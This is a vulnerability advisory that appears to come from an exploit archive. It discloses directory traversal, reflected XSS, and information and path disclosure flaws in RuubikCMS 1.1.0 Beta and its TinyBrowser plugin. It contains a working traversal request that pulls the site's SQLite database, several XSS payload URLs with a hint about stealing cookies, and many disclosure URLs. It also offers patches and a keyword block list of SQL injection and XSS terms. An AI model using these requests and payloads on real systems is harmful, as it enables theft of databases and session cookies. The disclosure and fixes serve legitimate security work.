@@ -1,0 +1,474 @@
+id: 18340
+date: 05/23/2012
+title: RuubikCMS 1.1.0 Beta XSS / Disclosure / Directory Traversal
+author: AkaStep
+cves: 
+
+=========================================================
+Vulnerable software: RuubikCMS Version 1.1.0 Beta
+Official site: http://www.ruubikcms.com/
+Downloaded from: http://www.ruubikcms.com/ruubikcms/download.php?f=ruubikcms111.zip
+=========================================================
+Tested:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.24
+=========================================================
+
+VUln Desc:
+RuubikCMS Version 1.1.0 Beta is prone to Traversal,XSS,
+Info And Path Disclosures.
+=========================================================
+
+1) Traversal vuln:
+//ruubikcms/extra/image.php
+Vulnerable code section:
+(To exploit this vuln you need to be authenticated against application)
+*This vuln can be exploited by users to escalate privileges to admin on windows OS*
+==============SNIP==================
+<?php
+// --- Image displayer with authentication
+// --- Sample call: image.php?f=imgfile.jpg
+// --- Sample call with subfolder: image.php?f=subfolder/imgfile.jpg
+
+require('../ruubikcms/includes/dbconfig.php');
+$dbh = new PDO(PDO_DB_DRIVER.':../'.RUUBIKCMS_FOLDER.'/'.PDO_DB_FOLDER.'/'.PDO_DB_NAME); // database connection object
+require('../ruubikcms/includes/commonfunc.php');
+define('LOGOUT_TIME', query_single("SELECT logout_time FROM options WHERE id = 1"));
+require('login/session.php');
+
+// check if logged in
+if (!@$_SESSION['uid']) die("Access denied.");
+
+// images directory
+define('BASE_DIR','useruploads/images/');
+
+// make sure program execution doesn't time out
+@set_time_limit(0);
+
+if (!isset($_GET['f']) OR empty($_GET['f'])) die("Please specify image.");
+if (strstr($_GET['f'], '../')) die('Error');
+$fpath = BASE_DIR.$_GET['f'];
+if (!is_file($fpath)) die("File does not exist.");
+
+// file size in bytes
+// $fsize = filesize($fpath);
+
+// get mime type
+$mtype = '';
+
+if (function_exists('mime_content_type')) {
+  $mtype = mime_content_type($fpath);
+} elseif (function_exists('finfo_file')) {
+  $finfo = finfo_open(FILEINFO_MIME); // return mime type
+  $mtype = finfo_file($finfo, $fpath);
+  finfo_close($finfo);
+}
+
+if ($mtype == '') {
+  $mtype = "image/jpeg";
+}
+
+header("Content-type: $mtype");
+readfile($fpath);
+?>
+=====================================
+
+
+We can traverse it on windows OS.
+Exploit:
+
+GET /learn/ruubikcms/extra/image.php?f=..\..\..\ruubikcms\sqlite\ruubikcms.sqlite HTTP/1.1
+Host: 192.168.0.15
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Cookie: cmslogin=1vbnblnfsb367lgoovsr1qdo2b9c2hav
+
+=============================*RAW responce body:*=============================
+
+
+HTTP/1.1 200 OK
+Date: Tue, 22 May 2012 12:01:24 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: image/jpeg
+
+34800
+SQLite format 3???@
+??<???????(???????????????????????????????????????????????????????????????
+?????????????????????????????????a%tablepagepage
+CREATE TABLE "page" ("pageurl" text PRIMARY KEY ,"name" text,"title" text,"header1" text,"description" text,
+"keywords" text,"content" text,"mother" text,"levelnum" integer,"ordernum" integer,"image1" text,"image2" text,
+"lang" text,"pagetype" integer,"extracode" text,"status" integer, "updater" TEXT, "updated" TEXT, "creator" TEXT)'
+;?indexsqlite_autoindex_page_1page?Ytablesitesite
+CREATE TABLE "site" ("id" integer PRIMARY KEY ,"name" text,"doctype" integer,"charset" text,"robots" text,
+"title" text,"description" text,"keywords" text,"copyright" text,"author" text,"lang" text,"gacode" text,
+"news_textlink" INTEGER,"news_readmore" INTEGER,"news_showdate" INTEGER,"news_maxshort" INTEGER, "no_image1"
+INTEGER, "no_image2" INTEGER, "clean_url" INTEGER, "url_suffix" TEXT, "news_num" INTEGER, "siteroot" TEXT,
+"news_read??????
+???
+???x?x????????????????????????????????????????????????????????????????????????????????????????
+?????????????????????????????????????????????????????????????????????????????????????????????????????????
+??????????????????????????????????????????????????????????????????????????????????????????????????????????
+??????????????????????????????????????????????????????????????????????????????????????????????????????????
+?????????????????????????????????????????????????????????????????????????????????????????????????????????
+???????????????????????????????????????????????????????????????????????????????????????????????????????????
+???????????????????????????????????????????????????????????????????????????????????????????????????????????
+?????????????????????????????????????????????????????????????????????????????????????????????????????????
+?????????????????????????????????????)!%)
+
+G?)!%)
+
+G
+
+
+?RuubikCMS Demoiso-8859-1index,followRuubikCMS DemoRuubikCMSIisakki Piril, Henrik Valrosfi?n
+Read more??????????????????????????????????????????????????????????????????????????
+??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+????????????????????????????????????????????????????????????"
+
+
+
+C
+
+??
+====================================EOF SNIP=====================================
+
+Use Fiddler to intercept RAW body of responce.
+
+
+
+
+How to fix?:
+Open //ruubikcms/extra/image.php
+Change the lines no 22 and 23 to this:
+
+//============BEGIN===========
+if (strstr(str_ireplace('\\','',$_GET['f']), '../')) die('Error');
+$fpath = BASE_DIR.$_GET['f'];
+//============END=============
+
+
+
+
+
+2) Due several XSS vulns in 3'rd party application called TinyBrowser 1.41
+(TinyBrowser 1.41 - A TinyMCE file browser (C) 2008  Bryn Jones
+(author website - http://www.lunarvis.com))
+ ruubikcms is also vulnerable to XSS.
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/folders.php?type=image&folder=&feid="/>a<script>alert(1);</script>
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=&feid="</a><script>alert(1);</script>
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image"</a><script>alert(1);</script>&folder=&feid=owned
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/upload.php?feid="</a><script>alert("AkaStep");</script>
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=&find="><script>alert("AkaStep");</script>
+
+
+HINT: charcode it if you want to steal cookies.
+
+
+For @admins,@users,@webmasters:
+To prevent XSS vulns in this case see below:(remember this is not ideal solution it is only *workaround*)
+Save all this stuff as antikiddie.php and upload it to:
+
+/ruubikcms/tiny_mce/plugins/tinybrowser/
+
+Then open config_tinybrowser.php and include your antikiddie.php
+in config_tinybrowser.php
+
+
+===================BEGIN==============
+<?php
+error_reporting('off');
+
+/*
+ //antikiddie.php
+ include it in your /ruubikcms/tiny_mce/plugins/tinybrowser/config_tinybrowser.php
+ (at bottom after <?php
+ )
+ like this:
+ include 'antikiddie.php';
+
+ ANOTHER NOTE:
+  we can add more tastes here but that may broke
+ application's api.So I removed a lot of tastes from here.
+ */
+
+$commonpatterns=array("$","/*","*","union",'"','\'',
+"0x",
+"where","concat","concat_ws","group_concat",
+"information_schema","tables","columns","where","concat","concat_ws","group_concat",
+"information_schema","tables","columns",'*',
+"hex","table_name","column_name","distinct",
+"/*!","*/","into","load_file",'(',')',
+"outfile","truncate","drop",
+"delete",";","+","substr","update",
+"hex","table_name","column_name",'\x00','\n','\r','\\','\\x1a',
+"schemata","mysql","convert","using","char","$","`","|",
+"\\","(","from",")",'mysql',
+"table","dumpfile","php",
+"distinct",'<','>','<script>','base64','alert','\\','</script>','%0d%0a',
+'document.write',',','String.fromCharCode','..','document.cookie','cookie','eval','href','document.location','location.replace','window',
+'onmouse','onblur','onfocus','onerror','\'','limit','javascript');
+
+
+foreach($commonpatterns as $myvals)
+{
+
+if(stristr(urldecode($_SERVER['QUERY_STRING']),$myvals))
+
+{
+
+
+    die('<script>alert("No Scriptkidding! :)");</script>'. PHP_EOL .
+        '<h1>Can\'t Proceed your request! It is malicious.</h1>');
+}
+}
+unset($myvals);
+?>
+
+
+
+==================END=================
+
+
+3)Info disclosure to get more info about system:
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/error.log
+
+
+4)Path disclosure:
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/newsmenu.php
+
+
+Notice: Use of undefined constant NEWS - assumed 'NEWS' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 4
+ NEWS
+
+Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31
+
+Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31
+
+
+
+http://192.168.0.15/learn/ruubikcms/extra/login/session.php
+
+
+
+Notice: Use of undefined constant LOGOUT_TIME - assumed 'LOGOUT_TIME' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\extra\login\session.php on line 17
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/dbconnection.php
+
+
+Notice: Use of undefined constant PDO_DB_DRIVER - assumed 'PDO_DB_DRIVER' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\dbconnection.php on line 3
+
+Notice: Use of undefined constant PDO_DB_FOLDER - assumed 'PDO_DB_FOLDER' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\dbconnection.php on line 3
+
+Notice: Use of undefined constant PDO_DB_NAME - assumed 'PDO_DB_NAME' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\dbconnection.php on line 3
+could not find driver
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/extrapagemenu.php
+
+
+Notice: Use of undefined constant EXTRAPAGES - assumed 'EXTRAPAGES' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\extrapagemenu.php on line 4
+EXTRAPAGES
+
+
+
+Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\extrapagemenu.php on line 17
+
+Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\extrapagemenu.php on line 17
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/footer.php
+
+Notice: Use of undefined constant VERSION - assumed 'VERSION' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
+
+Notice: Use of undefined constant VERNUM - assumed 'VERNUM' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
+VERSION VERNUM
+Notice: Use of undefined constant THANKYOUTEXT - assumed 'THANKYOUTEXT' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
+
+Notice: Use of undefined constant DOCUMENTATION - assumed 'DOCUMENTATION' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
+
+Notice: Use of undefined constant FEEDBACK - assumed 'FEEDBACK' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\footer.php on line 5
+THANKYOUTEXT RuubikCMS | DOCUMENTATION | FEEDBACK
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/head.php
+See title of page.
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/mainmenu.php
+A lot of notices.
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/multilang.php
+
+
+
+Notice: Undefined variable: multilang_links in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\multilang.php on line 2
+
+Warning: Invalid argument supplied for foreach() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\multilang.php on line 2
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/newsmenu.php
+
+
+Notice: Use of undefined constant NEWS - assumed 'NEWS' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 4
+NEWS
+
+Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31
+
+Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\newsmenu.php on line 31
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/pagemenu.php
+
+
+Notice: Use of undefined constant WEBPAGES - assumed 'WEBPAGES' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\pagemenu.php on line 4
+WEBPAGES
+
+
+
+Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\pagemenu.php on line 17
+
+Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\pagemenu.php on line 17
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/required.php
+
+
+Warning: require(../includes/dbconfig.php) [function.require]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\required.php on line 4
+
+Fatal error: require() [function.require]: Failed opening required '../includes/dbconfig.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\required.php on line 4
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/snippetmenu.php
+
+Notice: Use of undefined constant SNIPPETS - assumed 'SNIPPETS' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\snippetmenu.php on line 4
+SNIPPETS
+TinyMCE
+
+Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\snippetmenu.php on line 17
+
+Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\snippetmenu.php on line 17
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/includes/usersmenu.php
+
+Notice: Use of undefined constant USERS - assumed 'USERS' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 4
+USERS
+
+Notice: Use of undefined constant ADMINISTRATORS - assumed 'ADMINISTRATORS' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 15
+ADMINISTRATORS
+
+Notice: Undefined variable: dbh in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 21
+
+Fatal error: Call to a member function query() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ruubikcms\ruubikcms\cms\includes\usersmenu.php on line 21
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/cms/login/form.php
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/filelink/filelink.php
+
+
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_standalone.js.php
+
+function tinyBrowserPopUp(type,formelementid,folder)
+{ tburl = "/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tinybrowser.php" + "?type=" +
+type + "&feid=" + formelementid; if (folder !== undefined) tburl += "&folder="+folder+"%2F";
+newwindow=window.open(tburl,'tinybrowser','height=495,width=785,scrollbars=yes,resizable=yes'); if
+(window.focus) {newwindow.focus()} return false; }
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_tinymce.js.php
+Contains full path to application in plaintext.
+
+http://192.168.0.15/learn/ruubikcms/ruubikcms/website/scripts/jquery.lightbox-0.5.js.php
+Direct Plaintext output.
+
+
+
+
+Workaround about info disclosures:
+
+Open ruubikcms\tiny_mce\plugins\tinybrowser\fns_tinybrowser.php
+
+Change the line no 423 to this:
+=========BEGIN========
+//error_log($err, 3, 'error.log');
+=========END==========
+
+
+or you can try:
+
+
+=========BEGIN========
+error_log($err, 3, 'error_log');
+=========END==========
+
+Do not forget remove your old error.log
+
+
+
+Workaround about path disclosures:
+Open your main .htaccess files (if it doesn't exist on public_html/.htaccess)
+create new one and copy/paste this:
+
+==========BEGIN======
+
+php_value error_reporting off
+
+
+
+
+==========END========
+
+This will disable all error reporting if any error,warnings,notices occurs.
+
+
+
+Vendor Notified about vulns.
+
+
+
+
+++++As always My Special Thanks to:++++
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com &&
+to all AA Team
+++++++++++++++++++++++++++++++++++++++++
+Thank you.
+
+/AkaStep ^_^
+
+
+
+#  0day.today [2023-03-22]  #
